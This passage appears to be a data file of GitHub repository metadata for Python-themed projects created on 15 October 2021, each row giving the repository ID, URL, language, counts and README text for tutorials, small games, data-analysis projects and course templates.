417515708;cron-python;https://github.com/kame8015/cron-python;Python;2021-10-15T13:48:13Z;0;0;0;cron-python Install dependencies $ python -m venv .venv $ source .venv/bin/activate $ pip install -r requirements_dev.txt $ pip install -r requirements.txt  How to run cron job with schedule $ python sample_schedule.py 1  # every 1 second $ python sample_schedule.py 15  # every 15 seconds  How to run cron job with time $ python sample_time.py 1  # every 1 second $ python sample_time.py 15  $ every 15 seconds  
417433342;daily-python;https://github.com/saladinbd/daily-python;Python;2021-10-15T08:56:32Z;0;0;0;Daily Python Philosophy I started my career with PHP, but when I learn python, I love it. But as professional life I hadn't much scope to learn python. After a long time, I decided I will focus on python, will not focus other language until improve my python skill as professional expert. Now I start my journey again ** Ref: https://github.com/darkprinx/break-the-ice-with-python 
417420114;python_trunk;https://github.com/549559414/python_trunk;Python;2021-10-15T08:12:22Z;0;0;0;python_trunk 
417490217;Intro_Python;https://github.com/Khongorzul26/Intro_Python;Jupyter Notebook;2021-10-15T12:23:39Z;0;0;0;Intro_Python 
417495475;python-whls;https://github.com/trgosk/python-whls;;2021-10-15T12:42:15Z;0;0;0;python-whls python-whls 
417539851;Python_Coursera;https://github.com/wuradairo/Python_Coursera;;2021-10-15T15:00:51Z;0;0;0;
417488472;python-tutorial;https://github.com/KonradK0/python-tutorial;Jupyter Notebook;2021-10-15T12:17:18Z;0;0;0;
417502488;python-projects;https://github.com/ben-oz/python-projects;Python;2021-10-15T13:05:36Z;0;0;0;python-projects  Decimal Number to Roman Numerals Convertor  
417520318;Python-Chatbot;https://github.com/kinyalaura/Python-Chatbot;Jupyter Notebook;2021-10-15T14:02:04Z;0;0;0;
417425299;python-data;https://github.com/cw-19960101/python-data;;2021-10-15T08:30:15Z;0;0;0;python-data this is a repository for python 
417527097;python-pandas;https://github.com/shiman21/python-pandas;Jupyter Notebook;2021-10-15T14:22:02Z;0;0;0;
417514648;algorithm-python;https://github.com/ZPTX4869/algorithm-python;Python;2021-10-15T13:44:58Z;0;0;0;
417504743;javascript_python;https://github.com/DrakeRamore/javascript_python;HTML;2021-10-15T13:13:05Z;0;0;0;
417420482;Python-for-Beginners;https://github.com/darkhunter141/Python-for-Beginners;;2021-10-15T08:13:35Z;1;1;0;Python-for-Beginners Learn Python - Free Interactive Python Tutorial 
417419482;nlp-for-beginners;https://github.com/Blogrammer/nlp-for-beginners;Python;2021-10-15T08:10:14Z;2;2;0;nlp-for-beginners Natural Language Processing with Python for Beginners 
417434218;python-dojo-local;https://github.com/zeninpalm/python-dojo-local;Jupyter Notebook;2021-10-15T08:59:33Z;0;0;0;
417447036;NanoSparrowPython;https://github.com/nanosparrow/NanoSparrowPython;;2021-10-15T09:44:01Z;0;0;0;NanoSparrowPython NanoSparrow Python Project 
417514967;art-using-python;https://github.com/ankit-rane/art-using-python;Python;2021-10-15T13:45:55Z;0;0;0;Summary  This is a program to create a spirograph in Python. Contributers These people contributed to the project!  Jaiyank Saxena (siphyshu@gmail.com) Mitrasish Basu Roy (mitrashis.roy2021@vitbhopal.ac.in) Ankit Rane (ankitrane0605@gmail.com) Tarushi Mishra (tarushimishra21@gmail.com)  
417465237;FieldMiraclePython;https://github.com/LizzieGri/FieldMiraclePython;Python;2021-10-15T10:52:36Z;0;0;0;FieldMiraclePython Test Driven Development 
417502441;Google_Translate_Python;https://github.com/vuikonao/Google_Translate_Python;Python;2021-10-15T13:05:24Z;0;0;0;
417477934;EMB_EWT_Python;https://github.com/annie-ho-dev/EMB_EWT_Python;Python;2021-10-15T11:39:11Z;0;0;0;
417473726;Test_python_web;https://github.com/bineea/Test_python_web;;2021-10-15T11:23:15Z;0;0;0;Test_python_web 
417456043;Python-GUI-calculator;https://github.com/Programmers-SL/Python-GUI-calculator;Python;2021-10-15T10:16:39Z;0;0;0;Python GUI calculator A GUI calculator created using python How to use   Download or clone this   install tkinter package in python. Type in cmd or terminal like this  pip install tk    run the python file after installing tkinter   
417549531;warrior_run_python;https://github.com/amj203/warrior_run_python;Python;2021-10-15T15:30:41Z;0;0;0;Warrior Run  How to play  Use the arrow keys to move around ◀🔼▶🔽 Avoid flying obstacles Reach to the shield to win   Cheat keys  Space to freeze the warrior 's' key to freeze the axe 'd' key to freeze the kunai  
417545173;DavesPythonFails;https://github.com/dhoelzer/DavesPythonFails;;2021-10-15T15:16:55Z;0;0;0;
417419630;python_tel_chatbot;https://github.com/James-Wachuka/python_tel_chatbot;Python;2021-10-15T08:10:41Z;0;0;0;python_tel_chatbot python telegram chatbot using telegram API 
417423911;Python-3-Lists-codeacademy-;https://github.com/irenenguyen2501/Python-3-Lists-codeacademy-;;2021-10-15T08:25:42Z;0;0;0;
417511861;python-random-quote;https://github.com/FuYanxi/python-random-quote;Python;2021-10-15T13:35:56Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417493501;IST220-Python-Introduction;https://github.com/maf946/IST220-Python-Introduction;Python;2021-10-15T12:35:15Z;0;0;0;"IST 220 Python Introduction You don't need to learn Python for this course, but I do think that at least a passing familiarity is a great asset, regardless of your major or career plans. First, review ""What is Python? Executive Summary"" from python.org. If you are interested, please review the linked comparisons between Python and other languages (this is perhaps especially interesting if you've taken a course like IST 140 and are familiar with Java). Next, once you have a basic familiarity with what Python is, let's get it set up on your virtual machine. We'll be using PyCharm, an integrated development environment, to make things a bit easier to manage. The IDE gives you a graphical application which combines  (this is why it's ""integrated"") several things which you would otherwise have to do with multiple applications, including the terminal. There are other IDEs aside from PyCharm, but I think this one is the best, and there is a free educational version. Everyone using the same IDE, within Ubuntu, reduces variability and makes it much easier for us to provide help if anything goes wrong while you're working on the lab. Installing PyCharm is as simple as installing any of the other programs we've installed so far this semester. Using your virtual machine's terminal, run both of the following commands:   sudo snap install pycharm-educational --classic   sudo apt install python3-pip   Then launch PyCharm by clicking on the app drawer (the 3x3 dots in the lower-left corner of the screen), then typing the first few letters of PyCharm (you don't even need to click in the text box—just start typing). Go through the standard terms of service and data sharing screens (choose whichever you wish), and then you'll be at the ""Welcome to PyCharm"" screen.  Click ""New Project."" Give your project the name ""220PythonIntro"", as shown in the screenshot below. Your ""Location"" field will have your name, instead of ""Marc,"" and the default location will work fine. Leave all of the other buttons and boxes as they are by default, and as shown in the screenshot. Then click ""Create.""  You should be greeted by a screen like the below:  The file main.py contains a series of instructions for the Python interpreter to execute. The typical cycle for development is to make some changes to that file (or other .py Python files), then run the interpreter, see how our code performs, make some more changes, run it again, and so forth. The easiest way to tell PyCharm that we're ready to run the script is to click the green ""Play"" button next to the line 1 marker. I've indicated this with a huge red arrow in the screenshot. Alternatively, you can select View -> Appearance -> Toolbar, and you'll see a row appear near the top of PyCharm which has a fixed-position Run button.  Once you run the script, you'll see ""Hi, PyCharm"" appear in the ""Run"" tool window, as highlighted in the screenshot below.  Let's modify the script to print your name, instead of PyCharm. Line 14 of the script currently reads:     print_hi('PyCharm') Replace 'PyCharm' with 'your_name', ex: 'Michael Myers'. Run it again, and you should see different output:  Congratulations. You are a Python developer, with all the rights, privileges, and responsibilities appertaining thereto. Your journey is not complete. Move on to Exploring Basic Python Syntax. "
417502886;flappy-bird-python-pygame;https://github.com/thecodenation-ig/flappy-bird-python-pygame;;2021-10-15T13:06:52Z;0;0;0;flappy-bird-python-pygame flappy bird game made with python (pygame) make sure you have pygame installed. Also download all the pics and audios to have the best experience. Earphones recommended! 
417509852;notecard-pseudo-sensor-python;https://github.com/blues/notecard-pseudo-sensor-python;Python;2021-10-15T13:29:32Z;0;0;0;NotecardPseudoSensor NotecardPseudoSensor provides an API interface to the internal sensors of the Blues Wireless Notecard. The goal of this abstraction is to offer a sensor to use with more advanced tutorials, which enables focus on the syntax necessary to perform basic Notecard transactions for those new to the platform. Installation With pip via PyPi: pip install notecard-pseudo-sensor  or pip3 install notecard-pseudo-sensor  Usage import notecard_pseudo_sensor  sensor = notecard_pseudo_sensor.NotecardPseudoSensor() print(sensor.temp()) print(sensor.humidity()) To learn more about Blues Wireless, the Notecard and Notehub, see:  blues.io notehub.io dev.blues.io  License Copyright (c) 2021 Blues, Inc. Released under the MIT license. See LICENSE for details. 
417515654;Analise_Python_Pandas;https://github.com/marceloxm/Analise_Python_Pandas;Jupyter Notebook;2021-10-15T13:48:02Z;0;0;0;Analise_Python_Pandas Análise de dados com Python e Pandas DESCRIÇÃO: Neste projeto, foi utilizado a biblioteca Pandas, uma biblioteca Python de código aberto para análise de dados. Ela dá ao Python a capacidade de trabalhar com dados do tipo planilha, permitindo carregar, manipular e combinar dados rapidamente, entre outras funções. 
417438640;CodingNinjaPythonBasic;https://github.com/Vipulhere/CodingNinjaPythonBasic;Python;2021-10-15T09:14:31Z;1;1;0;CodingNinjaPythonBasic Codes of Basic python Exercise of Coding Ninja 
417457546;Mini_Python_Projects;https://github.com/Lubula/Mini_Python_Projects;Jupyter Notebook;2021-10-15T10:22:33Z;0;0;0;Mini_Python_Projects My Mini Python Projects Collection of game:  Mini Quiz Number Guessing game Rock Paper Scissors Choose your own adventure Password Manager  
417425201;Python_forBigData;https://github.com/jungdahae1225/Python_forBigData;Python;2021-10-15T08:29:54Z;0;0;0;
417431291;python_course_test;https://github.com/AkhileshGupta03/python_course_test;;2021-10-15T08:50:07Z;0;0;0;
417439880;Email_Sending_with_python;https://github.com/Selenium-Based-Automation-Website/Email_Sending_with_python;;2021-10-15T09:18:41Z;0;0;0;We create this repo for sending email with python 
417444172;Password-Manager-Python-kivy-;https://github.com/Gaurav-Bhoi/Password-Manager-Python-kivy-;Python;2021-10-15T09:33:57Z;0;0;0;
417529039;otaku-python-shop;https://github.com/Ren0503/otaku-python-shop;Python;2021-10-15T14:27:53Z;0;0;0;
417456114;pythonexcercise-1and2;https://github.com/raissaazaria/pythonexcercise-1and2;Python;2021-10-15T10:16:55Z;0;0;0;
417544975;python-arm64-wheels;https://github.com/armenzg/python-arm64-wheels;;2021-10-15T15:16:21Z;0;0;0;
417529092;rede_neural_python;https://github.com/Rafael-Benicio/rede_neural_python;Python;2021-10-15T14:28:02Z;0;0;0;rede_neural_python 
417470326;python_web_framework;https://github.com/mojtabaakbari221b/python_web_framework;Python;2021-10-15T11:10:44Z;0;0;0;write simple python webframework with wsgi and gunicorn We implement different layers of a framework to understand how big frameworks extend this behaviors . 
417458627;Shapes-In-Python;https://github.com/MuffinDev9/Shapes-In-Python;Python;2021-10-15T10:26:26Z;0;0;0;Shapes-In-Python It's A Program That When You Tell It What Shape You Want, It Prints That Shape On To The Screen. It Can Only Do Square, Triangle, And Circle So Far, But I Will Add More In The Future. This Was Made By A Very Dumb Muffin. 
417530314;python-opencv-ocr;https://github.com/GreaZeY/python-opencv-ocr;Jupyter Notebook;2021-10-15T14:31:54Z;0;0;0;python-opencv-ocr A OCR app made by using OpenCV pytesseract and tkinter libraries. To use this just install these libraries and python 3.6 or later and pyinstaller to make a executable file. Screenshot  
417559107;python-random-quote;https://github.com/leon4113/python-random-quote;Python;2021-10-15T16:02:11Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417515165;Python-Data-Types;https://github.com/skfreego/Python-Data-Types;Python;2021-10-15T13:46:33Z;0;0;0;"Python Data Types HackerRank Challenges| Domain:Python| Sub Domain:Basic Data Types list_comprehension|  List comprehensions are an elegant way to build a list without having to use different for loops to append values one by one.  The simplest form of a list comprehension is: [ expression-involving-loop-variable for loop-variable in sequence ] This will step over every element in a sequence, successively setting the loop-variable equal to every element one at a time. It will then build up a list by evaluating the expression-involving-loop-variable for each one. This eliminates the need to use lambda forms and generally produces a much more readable code than using map() and a more compact code than using a for loop.   ListOfNumbers = [ x for x in range(10) ] # List of integers from 0 to 9 ListOfNumbers [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]   You are given three integers x,y and z representing the dimensions of a cuboid along with an integer n. Print a list of all possible coordinates given by (i,j,k) on a 3d grid where the sum of i+j+k is not equal to n. Example: x = 1, y= 1, z = 2, n = 3 All Permutations of |i,j,k| are: [[0,0,0],[0,0,1],[0,0,2],[0,1,0],[0,1,1],[0,1,2],[1,0,0],[1,0,1],[1,0,2],[1,1,0],[1,1,1],[1,1,2]] Print an array of the elements that do not sum to n = 3 [[0,0,0],[0,0,1],[0,0,2],[0,1,0],[0,1,1],[1,0,0],[1,0,1],[1,1,0],[1,1,2]] nested_lists| A nested list is a list that contains another list (i.e.: a list of lists). It is also referred to as a multi-diminsional array. For example, a 2 dimensional array is used below: nested_list = [['blue', 'green'], ['red', 'black'], ['blue', 'white']]  print len(nested_list) # prints 3 print nested_list[1] # prints ['red', 'black'] print nested_list[1][0] # prints red  To go through every element in this list, use a nested for loop. >>> nested_list = [['blue', 'green'], ['red', 'black'], ['blue', 'white']] >>> for inner in nested_list: ...     for value in inner: ...         print value ...  blue green red black blue white  finding_the_percentage| A dictionary is a data type which stores values in pairs. For each element in the dictionary, there is a unique key that points to a value. A dictionary is mutable. It can be changed.  For example: a_dict = {'one': 1} # Here 'one' is the key. Note: The key of a dictionary is immutable. We cannot use a list as a key because a list is mutable. But we can make a tuple of list and use as key. a_dict['two'] = 2 # Adds key 'two' which points to 2 print a_dict['one'] #prints 1 if 'three' in a_dict: # To check whether a certain string exist as a key in the dictionary print a_dict['three'] else: print ""Three not there"" # prints Three not there del a_dict['one'] # Deletes index 'one' and the value associated with it print a_dict # prints {'two': 2} Note: A dictionary is unordered. So, only use the keys to navigate through the dictionary. list| When we talk about storing multiple values in a container-like data structure, the first thing that comes to mind is a list. You can initialize a list as:  arr = list() #or simply arr = [] or with a few elements as: arr = [1,2,3] Elements can be accessed easily similar to most programming languages: print arr[0] #result is 1 print arr[0] + arr[1] + arr[2] #result is 6 Lists in Python are very versatile. You can add almost anything in a Python list.  In Python, you can create a list of any objects: strings, integers, or even lists. You can even add multiple types in a single list! Let's look at some of the methods you can use on list. 1.) append(x)    Adds a single element x to the end of a list.    arr.append(9)       print arr          # prints [1, 2, 3, 9]  2.) extend(L)         Merges another list L to the end.         arr.extend([10,11])         print arr         # prints [1, 2, 3, 9, 10, 11]  3.) insert(i,x)          Inserts element x at position i.          arr.insert(3,7)          print arr          # prints [1, 2, 3, 7, 9, 10, 11]  4.) remove(x)          Removes the first occurrence of element x.          arr.remove(10)            arr        # prints [1, 2, 3, 7, 9, 11]  5.) pop()          Removes the last element of a list. If an argument is passed, that index item is popped out.          temp = arr.pop()           print temp           # prints 11  6.) index(x)      Returns the first index of a value in the list. Throws an error if it's not found.          temp = arr.index(3)      print temp      # prints 2  7.) count(x)      Counts the number of occurrences of an element x.      temp = arr.count(1)      print temp      # prints 1  8.) sort() Sorts the list. arr.sort()  	print arr # [1, 2, 3, 7, 9]  9.) reverse() Reverses the list. arr.reverse() print arr # [9, 7, 3, 2, 1]  tuples| Tuples are data structures that look a lot like lists. Unlike lists, tuples are immutable (meaning that they cannot be modified once created). This restricts their use because we cannot add, remove, or assign values; however, it gives us an advantage in space and time complexities. A common tuple use is the swapping of 2 numbers: a, b = b, a Here a,b is a tuple, and it assigns itself the values of b,a. Another awesome use of tuples is as keys in a dictionary. In other words, tuples are hashab  find_the_runner_up_score| ... Innominion_OCT_21_Internship Innomatics Research Labs "
417462431;SnakeGame-Using-Python;https://github.com/viral-since-2001/SnakeGame-Using-Python;Python;2021-10-15T10:41:15Z;0;0;0;SnakeGame-Using-Python Downlaod the archive and extract all the file in the single folder. Run the snakegame.py file and press the enter to play . 
417474018;example-grpc-client-python;https://github.com/z3f1r/example-grpc-client-python;Python;2021-10-15T11:24:18Z;0;0;0;Example a Python-client for a gRPC service Build $ python3 -m venv .venv $ source .venv/bin/activate  $ python -m pip install grpcio $ python -m pip install grpcio-tools  $ python -m grpc_tools.protoc -I ./proto --python_out=. --grpc_python_out=. ./proto/web/*/*.proto  encoder.py Есть расширение формата сообщений gRPC — gRPC-Web Пример таких сообщений: POST /my.example.timeservice.TimeService/GetTime HTTP/2 Host: api.example.com Content-Type: application/grpc-web-text+proto Authorization: Bearer ... ...  AAAAAAA=   HTTP/2 200 OK Content-Type: application/grpc-web-text+proto ...  AAAAAAA=gAAAAB5ncnBjLXN0YXR1czowDQpncnBjLW1lc3NhZ2U6DQo=  В encoder.py реализовал кодирование/декодированиие таких сообщениий client.py Пример запроса/ответа по протоколу gRPC. 
417432004;IPLS-python-API;https://github.com/ChristodoulosPappas/IPLS-python-API;Python;2021-10-15T08:52:24Z;0;0;0;
417479399;Python-Chatbot-Flask;https://github.com/ShollyWolly/Python-Chatbot-Flask;Python;2021-10-15T11:44:40Z;0;0;0;Python-Chatbot-Flask This is Sholly, a personal Assistant if you want to try him out, just use the provided docker-compose.yaml and everything will work just fine. After that just visit localhost:5000. Careful: Since this is just for demonstration I didn't add an actual flask-application server, do not use this in Production without changing it. 
417483223;python_and_cpp_playground;https://github.com/R2Road/python_and_cpp_playground;;2021-10-15T11:58:45Z;0;0;0;python_and_cpp_playground CPP 프로젝트에서 Python 사용 
417427788;python_5_les;https://github.com/klimova00/python_5_les;;2021-10-15T08:38:27Z;0;0;0;python_5_les 
417499845;python-2.3;https://github.com/UP-Polina-97/python-2.3;Python;2021-10-15T12:57:09Z;0;0;0;
417507837;Data-Visualization-with-Python;https://github.com/Natalia-Crudele/Data-Visualization-with-Python;Jupyter Notebook;2021-10-15T13:22:54Z;0;0;0;
417507074;python-tkinter-project;https://github.com/prasaddevi9711/python-tkinter-project;Python;2021-10-15T13:20:31Z;0;0;0;python-tkinter-project 
417470534;Big_data_python;https://github.com/delphinelepront/Big_data_python;Jupyter Notebook;2021-10-15T11:11:34Z;0;0;0;Big_data_python API  https://api.spacexdata.com/v4/launches https://api.spacexdata.com/v3/payloads https://api.spacexdata.com/v4/launchpads https://weatherbit-v1-mashape.p.rapidapi.com/forecast/3hourly  Présentation PowerPoint https://docs.google.com/presentation/d/1ZToAlsDwkg5xs0vK37UW9KjbCsiW48K2XSBdNQfajAY/edit?usp=sharing Contributeurs  Ryan Daoud Aïmen Zemzmi Rodolphe de Scorraille Delphine Lepront  
417530854;Python-AI_4;https://github.com/JHWannabe/Python-AI_4;Jupyter Notebook;2021-10-15T14:33:29Z;0;0;0;
417466853;treinaweb-workshop-python;https://github.com/cudo80/treinaweb-workshop-python;Python;2021-10-15T10:58:33Z;0;0;0;treinaweb-workshop-python Desenvolvimento Web Backend e criação de API com Python e Django 
417450766;SNAKE-GAME-IN-PYTHON;https://github.com/adi171701/SNAKE-GAME-IN-PYTHON;Python;2021-10-15T09:57:21Z;0;0;0;SNAKE-GAME-IN-PYTHON 
417505224;Python-scoring-algorithm;https://github.com/isaccanedo/Python-scoring-algorithm;Python;2021-10-15T13:14:33Z;0;0;0;Python-scoring-algorithm 🔒 Analise os dados usando um algoritmo de proximidade percentual baseado em faixa e calcule a estimativa de máxima verossimilhança linear. O princípio básico é que todos os valores fornecidos serão divididos em um intervalo de 0 a 1 e a pontuação de cada coluna será somada para obter a pontuação total. 
417522190;KocPythonCourse;https://github.com/sbbasaran/KocPythonCourse;Jupyter Notebook;2021-10-15T14:07:19Z;0;0;0;KocPythonCourse 
417524343;Python-HIT_TV_2021;https://github.com/ngluonghungg2611/Python-HIT_TV_2021;Python;2021-10-15T14:13:36Z;0;0;0;
417472162;contoh-program-python-biodata;https://github.com/pesonainformatika/contoh-program-python-biodata;Python;2021-10-15T11:17:26Z;0;0;0;##contoh program python biodata Untuk memulai mempelajari contoh program python biodata tentunya anda harus tau cara menjalankan program python di komputer atau laptop kan yaa, jika belum tahu anda bisa kunjugi halaman ini: Cara menjalankan python di cmd . Saya harap anda juga sudah setidaknya mengetahui dasar-dasar python. postingan selengkapnya bisa dibaca disini: https://pesonainformatika.com/python/contoh-program-python-biodata/ 
417497645;python-for-finance;https://github.com/SherryS997/python-for-finance;;2021-10-15T12:49:39Z;0;0;0;python-for-finance Python for finance 
417494053;Python---Tip-calculator;https://github.com/JavaHalla/Python---Tip-calculator;Python;2021-10-15T12:37:12Z;0;0;0;
417532779;set-operation-python;https://github.com/Debayan97531/set-operation-python;;2021-10-15T14:39:12Z;0;0;0;"set-operation-python Program to perform different set operations as we do in  mathematics sets are define A = {0, 2, 4, 6, 8}; B = {1, 2, 3, 4, 5}; union print(""Union :"", A | B) intersection print(""Intersection :"", A & B) difference print(""Difference :"", A - B) symmetric difference print(""Symmetric difference :"", A ^ B) "
417466614;Machine-Learning-with-Python-;https://github.com/shivanxshh/Machine-Learning-with-Python-;Jupyter Notebook;2021-10-15T10:57:43Z;0;0;0;Machine-Learning-with-Python-1 
417483511;Data-Analysis-Python;https://github.com/AmitKumarAnalysis/Data-Analysis-Python;Jupyter Notebook;2021-10-15T12:00:00Z;0;0;0;
417484638;Nesne-tanima-yazilimi-python;https://github.com/yagmurislim/Nesne-tanima-yazilimi-python;;2021-10-15T12:03:43Z;0;0;0;
417447733;HTML-Code-in-Python;https://github.com/DakshRocks21/HTML-Code-in-Python;Python;2021-10-15T09:46:34Z;0;0;0;
417431481;hwanitBackendPython;https://github.com/oussema2/hwanitBackendPython;Python;2021-10-15T08:50:44Z;0;0;0;
417550764;NLP-Spark-with-Python;https://github.com/MariosTserpes/NLP-Spark-with-Python;Python;2021-10-15T15:34:54Z;0;0;0;Big-Data-with-PySpark Spark and Python for Big Data NLP Spark with Python  Building a Spam Detection filter using Python and Spark.  
417502118;CursoPythonIntermedio;https://github.com/PiperPimientos/CursoPythonIntermedio;Python;2021-10-15T13:04:18Z;0;0;0;CursoPythonIntermedio 
417456973;roman-numerals-python;https://github.com/christianhujer/roman-numerals-python;Python;2021-10-15T10:20:29Z;0;0;0;template-python Project template for Python projects. Features  Supports TDD using Python Unittest. Supports BDD using Behave. Coverage Report. Static Code Analysis using mypy and prospector. Supports virtual environment. Incremental Makefile. Supports SonarQube, can run SonarQube locally via Docker.  
417424734;Python-basic-programs;https://github.com/soujanyavatt/Python-basic-programs;Jupyter Notebook;2021-10-15T08:28:23Z;0;0;0;Python-basic-programs 
417483384;python-film-api;https://github.com/yunusyurtyeri/python-film-api;Python;2021-10-15T11:59:25Z;0;0;0;
417477951;kivy-tcode-python-;https://github.com/CodeWithShamim/kivy-tcode-python-;Python;2021-10-15T11:39:15Z;0;0;0;kivy-tcode-python- 
417539833;Python-Login-Signup-CLI;https://github.com/noahpyn/Python-Login-Signup-CLI;Python;2021-10-15T15:00:48Z;0;0;0;Python-Login-Signup-CLI A simple user login and signup CLI program !  
417506793;Python-linear-congruential-generator;https://github.com/isaccanedo/Python-linear-congruential-generator;Python;2021-10-15T13:19:32Z;0;0;0;Python-linear-congruential-generator 🐹 O valor padrão para ** seed ** é o resultado de uma chamada de função que normalmente não é recomendada e faz com que flake8-bugbear gere um erro B008. No entanto, neste caso, é aceitável porque LinearCongruentialGenerator .__ init __ () será chamado apenas uma vez por instância e garante que cada instância irá gerar uma sequência única de números. 
417551969;Python-RandomSmallPrograms;https://github.com/giorgos-athanassopoulos/Python-RandomSmallPrograms;Python;2021-10-15T15:39:01Z;0;0;0;Python-RandomSmallPrograms random python small programs 
417554253;Colission_in_python;https://github.com/LeonardoFelixFrancis/Colission_in_python;;2021-10-15T15:46:08Z;0;0;0;Colission_in_python Collision code using python and pygame 
417479201;MFRC522-python;https://github.com/fintzd/MFRC522-python;Python;2021-10-15T11:43:54Z;0;0;0;MFRC522-python Python library to read/write RFID tags via the budget MFRC522 RFID module. 
417453070;api-framework-python;https://github.com/ashikkumar23/api-framework-python;;2021-10-15T10:05:32Z;0;0;0;api-framework-python 
417535894;python-design-patterns;https://github.com/imobanco/python-design-patterns;;2021-10-15T14:48:39Z;0;0;0;python-design-patterns Implementações de padrões de projeto!  https://refactoring.guru/design-patterns  
417427552;Python-15.10.21;https://github.com/Mihadze/Python-15.10.21;Python;2021-10-15T08:37:37Z;0;0;0;
417428524;DMF_python_defect_predictor;https://github.com/ikvibhavsogeti/DMF_python_defect_predictor;;2021-10-15T08:40:51Z;1;1;1;DMF_python_defect_predictor Good Links Git  https://nvie.com/posts/a-successful-git-branching-model/  
417441281;python-test-repo;https://github.com/grandparentproject-org/python-test-repo;Python;2021-10-15T09:23:42Z;0;0;0;pyhton test repo for security testing whitelist mankind 
417498391;Python_dz_2;https://github.com/AlexShadrin/Python_dz_2;Python;2021-10-15T12:52:11Z;0;0;0;
417495253;Python---Black-Jack-Game;https://github.com/JavaHalla/Python---Black-Jack-Game;Python;2021-10-15T12:41:26Z;0;0;0;
417421863;charm_private_python;https://github.com/cosmolgj/charm_private_python;Python;2021-10-15T08:18:26Z;0;0;0;
417480612;python-tarefa-ceub;https://github.com/guiolib/python-tarefa-ceub;Python;2021-10-15T11:49:00Z;0;0;0;
417513543;NYCDSA_Python_Project;https://github.com/hjgoode3/NYCDSA_Python_Project;Jupyter Notebook;2021-10-15T13:41:29Z;0;0;0;Data Set Information Data was web scraped using Python's Beautiful Soup package from: http://rotoguru1.com/cgi-bin/fyday.pl?game=fd This project analyzes weekly fantasy football data across the platforms FanDuel, DraftKings, and Yahoo Sports.Weekly fantasy football consists of online contests in which you play against friends or get paired with random other competitors on the host website. The goal of the contest is to score the most points among your competitors.Points are scored based on a points system corresponding to the accrual of stats by individual players during NFL games. For each contest, competitors draft a team of players filling specific position types. For examples each team could be required to have 1 Quarterback, 2 Running Backs, 2 Wide Receivers, 1 Tight End, and 1 Defense. Each player has a salary in virtual dollars required to be paid to draft the player for the week. Each competitor has a budget of virtual dollars used to fill his team for the contest. Better players (who are anticipated to score a large number of points) have a higher salary cost associated with them. Contests are played on a weekly basis corresponding to a week of the NFL season. Once all NFL games for the week are played, the player who's team scored the most points is named the winner. Columns Week:  Number 1 - 17 corresponding to the week of the NFL season a game took place Year: Number 2017 - 2021 corresponding to the year an NFL season took place GID: Generic ID used by the website as an index for the data. Name: Name of NFL player recording points in the contest Pos: Position of the NFL player recording points in the contest Team: NFL team the player recording points belongs to h/a: 'h' or 'a' designation for whether the game was played at home or away Oppt: 'Opponent' The opposing NFL team the player recording points was competing against FD points: Fantasy points the player recorded on the FanDuel platform FD salary: Virtual dollars required to draft a player for a contest on the FanDuel platform DK points: Fantasy points the player recorded on the DraftKings platform DK salary: Virtual dollars required to draft a player for a contest on the DraftKings platform YH points: Fantasy points the player recorded on the Yahoo Sports platform YH salary: Virtual dollars required to draft a player for a contest on the Yahoo Sports platform 
417522772;Python-UMA-Implementation;https://github.com/cingalls-git/Python-UMA-Implementation;Python;2021-10-15T14:08:59Z;0;0;0;"Python-UMA-Implementation Takes templated input data via csv and creates customized output files based on client specified parameters and requirements.  csv files are the test source data files. They are loaded in to the data frames and transacted on. They should not be edited. ClientTemplate.py is the superclass. It loads the data from the source files in to a dataframe and prepares the data frame to be transacted on by the individual client objects, which are the subclass of ClientTemplate.py. Clients.py: subclass of ClientTemplate. Takes the standard client template and customizes it based on the client and/or client template. Some things that are customized by client/template are cash symbol, weight column name, cash restrictions. DFHelpers: helper functions to update fields in the provided data frame. Returns the updated data frame. Email: template function to auto create emails. ProRata: current state is not integrated; however, will be a function to prorate cash for a client based on their minimum cash weight. For example, if current cash is 1% and the client cannot accept a file with cash less than 2%, ProRata.py will prorate 1% of cash out of securities based on their weights to proportionately raise the 1% cash required to submit the file. Main.py: Loops through the cleint_dict and client_email dictoinaries to create all the files based on client parameters.  "
417471523;Learn-Python-on-Replit;https://github.com/Mimansa-sudo/Learn-Python-on-Replit;;2021-10-15T11:15:01Z;0;0;0;Learn-Python-on-Replit A simple code to start with Python. Contributors Arjama Pal Saransh Yadav Kunal Singh Patel 
417442733;python_script_for_zipping;https://github.com/Radoslav-Stxrmy/python_script_for_zipping;Python;2021-10-15T09:28:47Z;0;0;0;python_script_for_zipping this is a script in python for zipping a directory in linux In order for the script to work, you must put the Directory in the same place the script is When you are done with adding the script go to Terminal, go to the directory in which the script and the Target Directory is and type this : python3 directoryzip.py 
417528682;MisionTIC2022-Python;https://github.com/julian1david/MisionTIC2022-Python;Python;2021-10-15T14:26:45Z;0;0;0;"""# MisionTIC2022-Python"" "
417528865;python-DB-Clients;https://github.com/noahbroyles/python-DB-Clients;Python;2021-10-15T14:27:20Z;1;1;0;python-DB-Clients A collection of database clients for different RDBs in Python 
417472123;python_dev_level0;https://github.com/Pavel-A87/python_dev_level0;Python;2021-10-15T11:17:19Z;0;0;0;
417523817;electron-python-integration-exp;https://github.com/LTSchmiddy/electron-python-integration-exp;;2021-10-15T14:12:07Z;0;0;0;
417532221;login_register_python;https://github.com/amj203/login_register_python;Python;2021-10-15T14:37:35Z;0;0;0;
417534908;python_backend_autumn_2021;https://github.com/mashchenko314/python_backend_autumn_2021;;2021-10-15T14:45:42Z;0;0;0;python_backend_autumn_2021 
417546719;python-github-classroom;https://github.com/phuijse/python-github-classroom;Python;2021-10-15T15:21:49Z;0;0;0;"Template assignment (Python) This is a template to create Python autograded assignments for github classroom Instructions for students  Implement your solutions in assignment.py The tests in test_assignment.py can be inspected but do not modify them We expected you to follow the ACM Code of Ethics  Instructions for teachers (Delete this section of the README in the final assignment) Setting up your classroom  Create a github organization to host your assignments Create your classroom using the recently created organization (Optionally) Upload your roster of students  Setting up the starter-code for your assignment  Create the private repository for your assignments using this repository as template Modify assignment.py and test_assignment.py to suit your needs Modify requirements.txt with the libraries needed to evaluate the codes Modify .github/classroom/autograding.json to set your tests (Optionally) If you added new files that need to be tested then modify .github/workflow/classroom.yaml accordingly (see comment on line 6)  Creating the 